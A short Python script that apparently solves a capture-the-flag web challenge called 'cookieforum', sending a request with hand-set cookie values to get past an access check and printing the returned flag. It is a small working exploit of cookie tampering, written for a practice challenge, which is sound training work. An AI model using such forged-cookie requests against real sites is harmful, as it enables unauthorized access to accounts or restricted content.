import re
import requests

URL = 'https://challenges.sshuzl.de/cookieforum/'

def main():
    cookies = {
        'Normal': '2005',
        'Super': '42'
    }
    r = requests.get(URL, cookies=cookies)
    flag = re.search(r'SSH{.*}', r.text).group(0)
    print(f"[+] Flag: {flag}")
    return

if __name__ == '__main__':
    main()
    pass